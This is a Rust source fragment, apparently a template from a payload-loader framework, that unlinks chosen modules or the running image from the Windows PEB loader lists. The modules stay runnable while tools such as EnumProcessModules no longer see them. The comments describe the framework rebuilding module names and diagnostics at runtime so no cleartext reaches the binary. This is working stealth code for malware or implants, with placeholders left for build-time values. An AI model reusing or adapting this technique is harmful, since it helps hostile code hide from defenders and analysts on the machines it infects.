// --- Hide module (technique fragment) ---
//
// Unlinks a module from the PEB's three loader lists so userland PEB walkers
// (`EnumProcessModules`, a hand-rolled `PEB->Ldr` walk, `GetModuleHandleA` /
// `GetProcAddress` by name) can no longer find it. The module's code, data and
// exports stay mapped and runnable; only the loader's metadata is edited. A
// Preparation: it never runs the payload.
//
// Per-build values (the module names, every diagnostic) are substituted by
// `Params::render_fragment` with code that rebuilds the value at runtime, so no
// module name and no diagnostic ever lands in `.rdata` in cleartext.

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::GetModuleHandleA;

/// `PEB->Ldr` (a `*mut PEB_LDR_DATA`): `0x0C` on x86, `0x18` on x64.
const LDR_OFFSET: usize = if cfg!(target_arch = "x86") { 0x0C } else { 0x18 };

/// `PEB_LDR_DATA` list heads: `InLoadOrderModuleList`,
/// `InMemoryOrderModuleList`, `InInitOrderModuleList` (circular doubly-linked
/// `LIST_ENTRY` lists).
const IN_LOAD_ORDER_OFFSET: usize = if cfg!(target_arch = "x86") { 0x0C } else { 0x10 };
const IN_MEMORY_ORDER_OFFSET: usize = if cfg!(target_arch = "x86") { 0x14 } else { 0x20 };
const IN_INIT_ORDER_OFFSET: usize = if cfg!(target_arch = "x86") { 0x1C } else { 0x30 };

/// `LDR_DATA_TABLE_ENTRY` fields, relative to the entry base — which equals its
/// `InLoadOrderLinks`, because that link sits at entry offset 0. The walk below
/// follows the `InLoadOrderModuleList`, so each `Flink` *is* the next entry base.
const ENTRY_IN_MEMORY_ORDER_OFFSET: usize = if cfg!(target_arch = "x86") { 0x08 } else { 0x10 };
const ENTRY_IN_INIT_ORDER_OFFSET: usize = if cfg!(target_arch = "x86") { 0x10 } else { 0x20 };
const ENTRY_DLL_BASE_OFFSET: usize = if cfg!(target_arch = "x86") { 0x18 } else { 0x30 };
/// `LDR_DATA_TABLE_ENTRY->BaseDllName`: a `UNICODE_STRING` at `0x2C` on x86,
/// `0x58` on x64 (`Length` u16 in bytes at +0, `MaximumLength` u16 at +2).
const ENTRY_BASE_DLL_NAME_OFFSET: usize = if cfg!(target_arch = "x86") { 0x2C } else { 0x58 };

/// `UNICODE_STRING->Buffer` offset inside the struct: `0x08` on x64 (the two
/// `u16` lengths are followed by four bytes of padding before the 8-byte
/// pointer), `0x04` on x86 (the 4-byte pointer follows the lengths directly, no
/// padding). `Length` excludes the terminating NUL.
const UNICODE_STRING_BUFFER_OFFSET: usize = if cfg!(target_arch = "x86") { 0x04 } else { 0x08 };

/// A broad cap on the list walk, so a corrupted `Flink` chain cannot hang the
/// loader. No real process has this many modules.
const MAX_MODULES: usize = 4096;

/// Reads the current thread's PEB (x64: `gs:[0x60]`).
#[cfg(target_arch = "x86_64")]
unsafe fn current_peb() -> *mut u8 {
    let peb: *mut u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, preserves_flags, readonly));
    peb
}

/// Reads the current thread's PEB (x86: `fs:[0x30]`).
#[cfg(target_arch = "x86")]
unsafe fn current_peb() -> *mut u8 {
    let peb: *mut u8;
    core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb, options(nostack, preserves_flags, readonly));
    peb
}

/// The three `LIST_ENTRY` links of one matched `LDR_DATA_TABLE_ENTRY`.
struct ModuleLinks {
    in_load: *mut u8,
    in_memory: *mut u8,
    in_init: *mut u8,
}

/// ASCII-lowercases one UTF-16 code unit (a non-ASCII unit passes through).
fn ascii_lower(unit: u16) -> u16 {
    if (b'A' as u16..=b'Z' as u16).contains(&unit) {
        unit + (b'a' - b'A') as u16
    } else {
        unit
    }
}

/// Case-insensitive ASCII comparison of a UTF-16 module base name against an
/// ASCII target.
///
/// Both sides go through [`ascii_lower`], so a non-ASCII code unit (which passes
/// through unchanged on both sides) matches only itself.
fn name_matches(name: &[u16], target: &str) -> bool {
    let target: Vec<u16> = target.encode_utf16().collect();
    name.len() == target.len()
        && name
            .iter()
            .zip(target.iter())
            .all(|(a, b)| ascii_lower(*a) == ascii_lower(*b))
}

/// Removes one `LIST_ENTRY` from its doubly-linked list, when it is linked.
///
/// A `LDR_DATA_TABLE_ENTRY` is not necessarily a member of every list: the main
/// image is not in the initialization-order list on current Windows, and its
/// `InInitializationOrderLinks` hold **null** (measured on Windows 11 26200).
/// Writing through those would fault, so the link is only removed when both
/// neighbours point back at it — the standard integrity test.
///
/// `Flink` is at offset 0 and `Blink` at `size_of::<usize>()`, on both widths.
/// Returns whether the link was actually unlinked.
unsafe fn unlink(link: *mut u8) -> bool {
    let pointer = core::mem::size_of::<usize>();
    let flink = link.cast::<*mut u8>().read() as *mut u8;
    let blink = link.add(pointer).cast::<*mut u8>().read() as *mut u8;
    if flink.is_null() || blink.is_null() {
        return false;
    }
    // Both neighbours must agree that `link` sits between them.
    if flink.add(pointer).cast::<*mut u8>().read() as *mut u8 != link
        || blink.cast::<*mut u8>().read() as *mut u8 != link
    {
        return false;
    }
    flink.add(pointer).cast::<*mut u8>().write(blink);
    blink.cast::<*mut u8>().write(flink);
    true
}

/// Unlinks the configured modules (and, when `hide_self` is set, the running
/// image) from the PEB's three loader lists.
///
/// Returns `Ok(true)`: a Preparation always lets the chain continue. A name the
/// plan listed but the process does not have is an error, because the step asked
/// for something impossible; `hide_self` is best effort.
pub fn hide_module() -> Result<bool, String> {
    let modules: Vec<String> = $MODULES_DEF$;
    let hide_self: bool = $HIDE_SELF$;

    let peb = unsafe { current_peb() };
    if peb.is_null() {
        return Err($MSG_PEB_FAILED$);
    }
    let ldr = unsafe { peb.add(LDR_OFFSET).cast::<*mut u8>().read() };
    if ldr.is_null() {
        return Err($MSG_LDR_FAILED$);
    }

    // `GetModuleHandleA(NULL)` returns the running image's base, which the PEB's
    // `ImageBaseAddress` also holds. A failure leaves `image_base` at 0, so the
    // `hide_self` match simply never fires.
    let image_base = match unsafe { GetModuleHandleA(PCSTR::null()) } {
        Ok(module) => module.0 as usize,
        Err(_) => 0,
    };

    // The walk starts at the `InLoadOrderModuleList` head, whose `Flink` points
    // at the first entry's `InLoadOrderLinks` (entry offset 0). It stops when
    // `Flink` returns to the head.
    let load_head = unsafe { ldr.add(IN_LOAD_ORDER_OFFSET) };
    let mut cursor = unsafe { load_head.cast::<*mut u8>().read() };

    let mut matched: Vec<ModuleLinks> = Vec::new();
    let mut found_names = vec![false; modules.len()];
    let mut steps = 0usize;

    while cursor != load_head && steps < MAX_MODULES {
        steps += 1;
        // `cursor` *is* the entry base: `InLoadOrderLinks` is at offset 0.
        let entry = cursor;
        let mut hit = false;

        if hide_self && image_base != 0 {
            let dll_base = unsafe { entry.add(ENTRY_DLL_BASE_OFFSET).cast::<usize>().read() };
            if dll_base == image_base {
                hit = true;
            }
        }

        if !modules.is_empty() {
            let name_base = unsafe { entry.add(ENTRY_BASE_DLL_NAME_OFFSET) };
            let length = unsafe { name_base.cast::<u16>().read() } as usize;
            let buffer = unsafe {
                name_base
                    .add(UNICODE_STRING_BUFFER_OFFSET)
                    .cast::<*mut u16>()
                    .read()
            };
            if !buffer.is_null() && length >= 2 {
                // `Length` is in bytes and excludes the terminating NUL.
                let name = unsafe { core::slice::from_raw_parts(buffer as *const u16, length / 2) };
                for (index, wanted) in modules.iter().enumerate() {
                    if !found_names[index] && name_matches(name, wanted) {
                        found_names[index] = true;
                        hit = true;
                    }
                }
            }
        }

        if hit {
            matched.push(ModuleLinks {
                in_load: entry,
                in_memory: unsafe { entry.add(ENTRY_IN_MEMORY_ORDER_OFFSET) },
                in_init: unsafe { entry.add(ENTRY_IN_INIT_ORDER_OFFSET) },
            });
        }

        cursor = unsafe { entry.cast::<*mut u8>().read() };
    }

    // A requested name that was not found is a plan error.
    if found_names.iter().any(|found| !*found) {
        return Err($MSG_NOT_FOUND$);
    }

    // Unlink every matched entry from all three lists. The entries were collected
    // first, so no list is walked while it is being modified.
    // Unlink every matched entry from the lists it is actually a member of. The
    // entries were collected first, so no list is walked while it is modified.
    let mut unlinked = 0usize;
    for links in &matched {
        unlinked += unsafe { unlink(links.in_load) } as usize;
        unlinked += unsafe { unlink(links.in_memory) } as usize;
        unlinked += unsafe { unlink(links.in_init) } as usize;
    }

    crate::tech_dbg!(
        "hide_module",
        "unlinked {unlinked} loader-list link(s) for {} module(s)",
        matched.len()
    );
    Ok(true)
}
